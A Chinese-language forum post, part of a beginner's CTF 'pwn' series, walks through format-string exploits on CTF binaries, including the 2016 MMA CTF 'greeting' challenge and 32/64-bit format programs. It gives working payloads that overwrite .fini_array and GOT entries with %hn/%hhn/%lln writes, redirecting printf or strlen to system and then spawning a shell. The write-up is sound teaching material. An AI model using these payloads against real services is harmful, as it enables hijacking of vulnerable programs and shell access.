
# [原创]新人PWN入坑总结(三)

不多说接上文

## 格式化字符串0x06

### 一、MMA CTF 2nd 2016-greeting

1.常规`checksec`，开了`canary`和`NX`。`IDA`打开找漏洞，`main`函数中格式化字符串漏洞：
```
#注释头





char v5; // [esp+5Ch] [ebp-44h]

char s; // [esp+1Ch] [ebp-84h]

-----------------------------------------------------

if ( !getnline(&v5, 64) )

sprintf(&s, "Nice to meet you, %s :)\n", &v5);

return printf(&s);
```
2.再找`system`，有导入，没有`binsh`，没有`Libc`。用格式化字符串修改某个函数的`got`表指向`system`函数，然后再次运行程序得以输入`binsh`传给该函数，相当于调用`system`函数，之后就可以`getshell`。但是发现该程序中没有循环，修改之后没办法再次输入。
3.这里需要用到C语言的结构执行：
![](https://bbs.kanxue.com/upload/attach/202108/904686_P9GYVYYKF6KDB4S.jpg)
C语言编译后，执行顺序如图所示，总的来说就是在`main`函数前会调用`.init`段代码和`.init_array`段的函数数组中每一个函数指针。同样的，`main`函数结束后也会调用`.fini`段代码和`.fini_array`段的函数数组中的每一个函数指针。
4.利用`main`函数结束时会调用`fini`段的函数组这一个特点，我们尝试找到`fini`函数组的地址，利用格式化字符串漏洞来修改该地址，修改`.fini_array`数组的第一个元素为`start`，使得`main`函数退出时运行该地址可以重复回到`start`来再次执行一次输入。
5.`.fini_array`段的地址直接`ctrl+s`就可以找到，内容是`__do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_aux`，保存的内容是一个地址，该地址对应是一个代码段，该代码段的函数名为`__do_global_dtors_aux proc near`。其它函数对应的`got`、`plt`可以通过`elf.pot\elf.plt`对应的来搜索。
6.但是这里存在一个问题，要将什么地址劫持为`system`函数？这个地址必须是在`getline`最后或者是之后，而且还需要有参数来执行`binsh`。第一个想到的是`sprintf`，因为该函数在`getline`函数之后，并且从右往左数第一个参数就是我们保存的内容，但是尝试过后发现崩溃了，修改是能修改，但是传参的时候有点问题。后面查看该函数汇编代码：
![](https://bbs.kanxue.com/upload/attach/202108/904686_2PBWYTKKVHU6GQJ.jpg)
可以看到查看该函数从栈上取的第一个参数应该是`s`这个数组，而不是我们穿的`v5`，而如果劫持为`system`函数，那么就要求栈上的`esp`指向的内容的地址是`binsh`字符串，但是这里确实指向`s`这个数组中的内容，为空，那么`system`函数就没办法调用成功了。后面又看`printf`函数，还是不行，因为这里`printf`函数的参数也是`s`这个数组，内容此时为空，无法顺利调用。之后再找，经过`getnline`函数内部可以发现有个`strlen`函数：
```
#注释头



#代码中的形式：

if ( !getnline(&v5, 64) )

----------------------------------------------------------------

getnline(char *s, int n)

return strlen(s);



#该函数原型：

unsigned int strlen(const char *str);

-------------------------------------------------------

#system函数原型：

int system(const char *command);
```
`system`函数调用规则是需要一个地址，地址上保存的内容是`binsh`字符串，或者直接`"binsh"`字符串赋予，C语言中就代表在全局变量中开辟一块内存，然后该内存保存的是`binsh`字符串，然后将该内存的地址赋予给`system`函数当作参数运行。总之就是`system`函数需要的参数是一个地址。
这里的`strlen`满足这个条件，虽然上面写的只是`s`，但是`s`中保存的内容是一个地址，输入`AAAA`，通过调试查看内容：
![](https://bbs.kanxue.com/upload/attach/202108/904686_ZTEVEQTPX3TMEW7.jpg)
![](https://bbs.kanxue.com/upload/attach/202108/904686_CKRFYMKBK2PEQ4S.jpg)
同样的，查看下汇编代码：
![](https://bbs.kanxue.com/upload/attach/202108/904686_S2Y5M8E3FADSWGZ.jpg)
可以看到`[esp+s]`相当于是取`s`的栈地址赋值给`eax`，然后`eax`赋值给`esp`栈顶，这两行破代码有病，一毛一样。所以现在跳转进`strlen`中的话，`esp`的值也就是参数，是一个栈上地址，内容就是`AAAA`。也就相当于在`strlen`中的`s`的值是一个地址，那么劫持后，就相当于`system(s)`，同样可以`getshell`。
▲劫持为`system`函数，要求原函数的参数也应该是一个地址才行，不然无法跳转。
7.确定攻击思路后，开始计算偏移，先用`IDA`简单远程调试，输入`AAAA`，然后将程序一直运行至`printf`处，可以看到栈中的偏移为12.5处会出现`A`的`ascii`值，也就是`41`。由于我们需要栈中完整的对应地址，所以需要输入`aa`填充两个字节，来使得偏移量从12.5到13处，从而能够完整地输入我们需要修改的地址。
8.之后编写`payload`，这里使用控制字符`%hn`一次改动两个字节：
`payload = 'aa'+p32(fini_array_addr+2) + p32(fini_array_addr) + p32(strlen_got+2) + p32(strlen_got) + str(格式化fini+2) + str(格式化fini) + str(格式化strlen_got+2) + str(格式化strlen_got)`
9.之后还得确定输出的值：
```
#注释头



fini_array = 0x08049934

start_addr = 0x080484f0

strlen_got = 0x08049a54

system_plt = 0x08048490
```
查看代码，由于`sprintf`的作用，`printf`的参数`s`保存的不止有我们输入的，还有`Nice to meet you,`计算加上`aa`可得总共有`8f-7c+1=0x14`个，再加上三个`32`位的地址`12`字节，总共`32`字节，也就是`0x20`。计算截至为 `str(格式化fini+2)`处。
10.另外由于`.fini_array`的内容为`0x080485a0`按 `d` 可查看数据，而我们需要更改的`start`地址为`0x080484f0`，所以只需要改动大端序列中的`85a0`变成`84f0`即可。所以格式化`.fini`中需要再输出的字节数应该是`0x84f0-0x20=0x84D0=34000`。而`0x08049934+2`处的内容本身就是`0804`，不需要修改。所以只需要修改`.fini_array_addr`对应的内容即可，`.fini_array+2`对应的内容本身就是`0804`，不用修改。所以`payload`可以删去`p32(fini_array_addr+2)`和`str(格式化fini+2)`。
11.接着计算，需要将`strlen_got+2`处的值改成`0804`，由于之前已经输出了`0x84f0`所以需要用到数据截断。也就是格式化内容中需要再输出的字节数为`0x10804-0x84f0=0x8314=33556`。
然后再计算`strlen_got`的值，需要再输出`0x18490-0x10804=0x7c8c=31884`。
故都计算完毕，最后`payload`为：
`payload = 'aa' + p32(fini_array_addr) + p32(strlen_got+2) + p32(strlen_got) + '%34000c%12$hn' + '%33556c%13$hn' + '%31884c%14$hn'`
12.`payload`之后，运行完第一次的`printf`之后，程序会回到`start`，之后需要再输入字符串`io.sendline('/bin/sh\x00')`来完整运行`system`，从而`getshell`。

### 二、Format_x86和format_x64

#### ★32位程序：

1.常规`checksec`，只开了`NX`。打开`IDA`查漏洞，`main`函数中格式化字符串漏洞：
```
#注释头



memset(&buf, 0, 0x12Cu);

read(0, &buf, 0x12Bu);

printf(&buf);
```
2.这里会有一个重复读取的循环，开`shell`需要`system`函数和`binsh`字符串，这里只有`system`函数，`got`和`plt`都对应有，没有`binsh`字符串，没有`libc`。
3.由于`printf`漏洞，我们可以利用这个漏洞向指定的内存地址写入指定的内容，这里考虑将`printf`的`got`中的值更改`system`函数`plt`表项的值。原本如果调用`printf`函数，则相当于执行`printf`函数的`got`表中保存的`printf`函数的真实地址处的代码，更改之后相当于执行`system`函数`plt`表地址处的代码，也就相当于调用`system`函数。原理如下：
原本执行`Printf`函数：相当于执行`printf`的执行代码
```
#注释头



printf_got_addr:   7Fxxxxxx

7Fxxxxxx:          printf的执行代码
```
更改之后：相当于执行`jmp system_got`代码，那就相当于执行`system`函数了
```
#注释头



printf_got_addr:          08048320(system_plt)

08048320(system_plt):     jmp system_got
```
4.那么预想程序总流程如下：第一次读取，输入`payload`，然后`printf`执行，将`printf`的`got`表更改为`system`函数`plt`表。通过`while`循环，第二次读取，输入`binsh`字符存入`buf`中，此时`printf(&buf)`，相当于`system(&buf)`，那就相当于`system(binsh)`，即可直接`getshell`。
5.编写`payload`，首先需要计算一下偏移地址，将断点下在`call printf`上，通过调试能够查看到`printf`写入栈中的地址距离`esp`的偏移量为`6`，所以使用控制字符`%n`来将`printf`劫持到`system`，这里偏移就会成`n-1`为`5`。偏移代表的是取参数的时候的偏移量，下面的`payload`对应的`5,6,7,8`就对应向地址`print_got, print_got+1, print_got+2, print_got+3`写入内容。由于是修改地址，所以用`%hhn`来逐个修改，防止向服务器发送过大数据从而出错。
(1)找到`got`表和`plt`表项的值
```
#注释头



printf_got = 0x08049778

system_plt = 0x08048320
```
(2)32位程序，4个字节一个地址，所以需要四个地址：
```
#注释头



payload = p32(printf_got)

payload += p32(printf_got+1)

payload += p32(printf_got+2)

payload += p32(printf_got+3)
```
(3)由于是大端序，低地址保存的是高地址的内容，`print_got`需要保存的应该是`system_plt`的最后一个字节，也就是`0x20`。
①由于前面已经输入了`p32(printf_got)+p32(printf_got1)+p32(printf_got2)+p32(printf_got3)`，这些在没有遇到`%`之前一定会被打印出来，共计`16`个字节，而我们需要让它总共打印出`0x20`个字节，所以我们再打印`(0x20-16)`个字节。
②同样，由于前面已经打印了`0x20`个字节，我们总共需要打印`0x83`个字节，所以应该再让程序打印`%(0x83-0x20)`个字节，之后道理相同。
```
#注释头





payload += "%"

payload += str(0x20-16)

payload += "c%5$hhn"

#写入0x20到地址print_got



payload += "%"

payload += str(0x83-0x20)

payload += "c%6$hhn"

#写入0x83到地址print_got+1



payload += "%"

payload += str(0x104-0x83)

payload += "c%7$hhn"

#写入0x04到地址print_got+2，0x104被截断为04



payload += "%"

payload += str(0x108-0x104)

payload += "c%8$hhn"

#写入0x08到地址print_got+3，0x108被截断为08
```
▲为了便于理解，下面代码也行：
```
#注释头



payload = p32(printf_got+1) 

#使用hhn写入，分别对应待写入的第3，4，2，1字节

payload += p32(printf_got)

payload += p32(printf_got+2)

payload += p32(printf_got+3)



payload += "%"

payload += str(0x83-16) #被写入的数据，注意四个地址长度是16，需要减掉

payload += "c%5$hhn"



payload += "%"

payload += str(0x120-0x83)

payload += "c%6$hhn"



payload += "%"

payload += str(0x204-0x120) #由于是hhn所以会被截断，只留后两位

payload += "c%7$hhn"



payload += "%"

payload += str(0x208-0x204)

payload += "c%8$hhn"
```
6.其实可以直接使用类`Fmtstr`，效果一样，将`Payload`替换成下列代码即可
`payload = fmtstr_payload(5, {printf_got:system_plt})`
7.之后再`io.sendline('/bin/sh\x00')`，即可`getshell`

#### ★64位程序

1.由于64位，传参的顺序为`rdi, rsi, rdx, rcx, r8, r9`，接下来才是栈，所以偏移量应该是`6`指向栈顶。之后考虑使用`fmtstr`来直接构造获取：
`payload = fmtstr_payload(6, {printf_got:system_plt})`
但是这个方法会出错，因为在这种情况下，我们的地址如下
```
#注释头



printf_got = 0x00601020

system_plt = 0x00400460
```
需要写入地址`printf_got`的首两位是`00`，且以`p64`形式发送，所以先发送的是`0x20, 0x10, 0x60, 0x00, 0x00.......`而`Read`函数读到`0x00`就会截断，默认这是字符串结束了，所以之后的都无效了。
2.那么考虑手动方式，将`p64(printf_got)`放在`payload`的末尾，这样就只有最后才会读到`0x00`，其它的有效数据都能读入。
3.使用手动方式就需要再次计算偏移量，我们的`payload`构成应该是
`payload = “%”+str(system_plt)+”c%8$lln” + p64(printf_got)`
这里偏移量为`8`是因为经过调试发现我们的输入从栈顶开始计算，也就是从栈顶开始，一共输入了
`1(%) + 7(0x400460转换成十进制为4195424，也就是7个字节) + 7(“c%8$lln”) + 8(p64_printf_got)=23`个字节。
经过计算我们发现，`p64`前面的字节数为`15`个字节，不足`8`的倍数，这样会导致`printf_got`的最后一个字节`20`被截断至偏移量为`7`的位置，从而使得偏移量为`8`的位置只有`6010`，导致出错。所以我们需要填充一个字节进去，让它不会被截断。
![](https://bbs.kanxue.com/upload/attach/202108/904686_R3TRQC6M99P9AKP.jpg)
```
#注释头



payload = ”a%” + str(system_plt-1)+”c%8$lln” + p64(printf_got)
```
加入一个字节`a`就可以使得在参数偏移量为`6`和`7`的位置中不会截断`0x601020`。同时加入字节`a`就要使`system_plt-1`来满足最终打印的字符个数为`0x00400460`，从而才能成功将`0x00400460(system_plt)`写入到`0x00601020(printf_got)`
5.完成`payload`之后，再次循环进入，输入`io.sendline('/bin/sh\x00')`后`interactive()`即可`getshell`
参考资料：
